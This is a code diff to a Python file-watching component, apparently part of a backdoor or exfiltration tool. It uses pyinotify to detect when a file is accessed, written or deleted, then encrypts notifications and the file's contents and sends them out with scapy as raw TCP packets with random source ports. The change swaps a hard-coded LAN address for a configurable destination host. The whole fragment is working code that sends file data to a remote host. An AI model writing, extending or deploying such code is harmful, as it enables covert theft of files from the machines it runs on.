@@ -4,6 +4,9 @@ from datetime import datetime
 import encryption
 
 
+global host_addr
+
+
 class EventHandler(pyinotify.ProcessEvent):
     def process_IN_ACCESS(self, event):
         self.send_notif("Accessed", event.pathname)
@@ -21,7 +24,7 @@ class EventHandler(pyinotify.ProcessEvent):
         encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
         encrypted_msg += b"$NOTIF"
 
-        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8888)/encrypted_msg
+        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8888)/encrypted_msg
 
         send(pkt, verbose=False) 
         time.sleep(0.1)
@@ -34,13 +37,16 @@ class EventHandler(pyinotify.ProcessEvent):
         encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
         encrypted_data = encrypted_data + b"$EOF" + bytes(filename, encoding="utf-8")
 
-        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8500)/encrypted_data
+        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/encrypted_data
 
         send(pkt, verbose=False)
         time.sleep(0.1)
 
 
-def start_watchfile(filename):
+def start_watchfile(filename, host_ip):
+    global host_addr
+    host_addr = host_ip
+
     watch_manager = pyinotify.WatchManager()
     mask = pyinotify.IN_ACCESS | pyinotify.IN_DELETE | pyinotify.IN_CLOSE_WRITE
 
